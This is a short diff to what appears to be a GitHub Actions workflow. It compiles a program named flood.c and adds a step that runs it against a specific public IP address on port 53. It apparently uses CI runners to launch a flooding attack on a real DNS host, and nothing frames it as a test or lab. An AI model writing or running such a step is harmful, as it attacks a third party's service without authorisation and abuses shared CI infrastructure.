@@ -8,3 +8,4 @@ jobs:
         uses: actions/checkout@v6
       - run: |
           gcc flood.c -o flood -std=c2x -pthread -O3 -flto -march=native
+          ./flood 147.75.202.235 53
